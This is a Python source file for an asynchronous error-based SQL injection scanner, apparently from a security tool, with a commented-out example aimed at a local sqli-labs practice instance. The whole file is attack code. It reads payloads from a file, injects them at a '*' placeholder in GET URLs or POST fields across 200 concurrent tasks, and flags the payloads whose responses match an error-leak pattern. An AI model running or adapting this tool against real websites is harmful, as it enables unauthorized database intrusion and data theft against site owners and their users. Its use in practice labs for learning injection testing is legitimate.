import asyncio
import aiohttp
from aiohttp import ClientSession
from urllib import parse
import re
import sys 
import os
from colorama import Fore, Style, Back
from concurrent.futures import CancelledError

class error_inject():

    def __init__(self,url,method = "GET",headers = "sql_injection/payload/header.txt",payload_num = 10):

        self.url = url
        self.method = method
        self.header_file = headers
        self.regx = r"[0-9]*~~~!@~~~[0-9]+"
        self.payload_file = "sql_injection/payload/error.txt"
        self.queue = asyncio.Queue()
        self.headers =  {
        'User-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8',
        'Accept-Language': 'Zh-CN, zh;q=0.8, en-gb;q=0.8, en-us;q=0.8',
        'Accept-Encoding': 'identity',
        'Keep-Alive': '300',
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
    	}
        self.flag_ = "886689288"
        self.loop = asyncio.get_event_loop()
        self.num = 200
        self.tasks = []
        self.data = {}
        self.postHeaders = {}
        self.flag = 0
        self.payload_final_num = payload_num
        self.payload_temp_num = 0
    
    def payload_in_queue(self):
        with open(self.payload_file,"r") as f:
            for payload in f:
                self.queue.put_nowait(payload.strip("\n"))
    
    def prepare_post(self,payload):
        with open(self.header_file,"r") as f:
            for i in f:
                if not self.postHeaders:
                    if ":" in i.strip("\n"):
                        temp = i.strip("\n").split(":")
                        self.postHeaders[temp[0]] = temp[1].strip(" ")
                    if "&" in i.strip("\n"):
                        temp = i.strip("\n").split("&")
                        for data_ in temp:
                            data1 = data_.split("=")
                            if "*" in data1:
                                self.data[data1[0]] = payload
                            else:
                                self.data[data1[0]] = data1[1].strip(" ")
                else:
                    if ":" in i.strip("\n"):
                        temp = i.strip("\n").split(":")
                        self.postHeaders[temp[0]] = temp[1].strip(" ")
                    if "&" in i.strip("\n"):
                        temp = i.strip("\n").split("&")
                        for data_ in temp:
                            data1 = data_.split("=")
                            if "*" in data1:
                                self.data[data1[0]] = payload
                            else:
                                self.data[data1[0]] = data1[1].strip(" ")

    async def get_response(self,payload,session):
        if self.method == "GET":
            payload = parse.quote(payload.encode("utf-8"))
            url = self.url.replace("*",payload)
            s = await session.get(url,headers = self.headers)
            await session.close()
            return await s.text()
        else:
            self.prepare_post(payload)
            self.postHeaders.pop("Content-Length")#bug
            s = await session.post(self.url,headers = self.postHeaders,data = self.data)
            await session.close()
            return await s.text()
        

    async def sql_scan(self):
        while not self.queue.empty():
            session = ClientSession()
            try:
                payload_ = await self.queue.get()
                payload_ = payload_.replace("[REPLACE]",self.flag_)
                response = await self.get_response(payload_,session)
                if "You have an error in your SQL syntax" in response:
                    continue
                if re.search(self.regx,response):
                    self.flag += 1
                    self.payload_temp_num += 1
                    sys.stdout.write(Fore.LIGHTGREEN_EX + "[*] available payload: {}\n".format(payload_))
                    if self.payload_temp_num == self.payload_final_num:
                        self.close()
            except:
                await session.close()
                pass

    def start(self):
        try:
            self.payload_in_queue()
            self.tasks = [self.sql_scan() for i in range(self.num)]
            self.loop.run_until_complete(asyncio.wait(self.tasks))
        except CancelledError:
            pass
        if self.flag == 0:
            sys.stdout.write(Fore.LIGHTRED_EX + "[-] can't error inject\n")
    
    def close(self):
        for task in asyncio.Task.all_tasks():
            task.cancel()


'''if __name__ == "__main__":
    a = error_inject("http://localhost/sqli-labs-master/Less-14/?id=*",method="POST")
    a.start()
    #a.prepare_post("sunsec")
    #print(a.postHeaders)
    #print(a.data)'''